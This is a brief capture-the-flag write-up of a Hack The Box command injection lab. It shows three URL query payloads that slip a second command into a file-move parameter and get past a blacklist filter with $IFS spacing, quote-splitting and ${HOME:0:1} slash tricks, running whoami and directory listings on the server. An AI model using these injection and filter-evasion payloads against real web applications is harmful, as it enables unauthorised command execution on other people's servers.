HTB Command Injection writeup

August 4, 2025; 6 min read

Concepts covered:

Command injection Filter bypass Blacklist bypass Obfuscation Space bypass

Login page & credentials

We are given a login page with valid credentials guest:guest.

Actions allowed panel

The panel shows copy and function operations.

Moving into tmp directory

Moving a file to /var/www/html/files/tmp works without error.

Blocked outside tmp

Attempting to move behind /tmp triggers a malicious block error.

Intercept & inject

The move command lives in the URL after index.php. We can chain commands using operators.

Bypass with obfuscation

?to=tmp$IFS%26w'h'oa'm'i&from=78113764.txt&finish=&move=

This returns www-data.

Listing home directory

?to=tmp$IFS%26l's'$IFS'-a'${HOME:0:1}&from=787113764.txt&finish=&move=

Retrieving the flag

?to=tmp$IFS%26l's'$IFS'-a'${PATH:0:1}&from=787113764.txt&finish=&move=
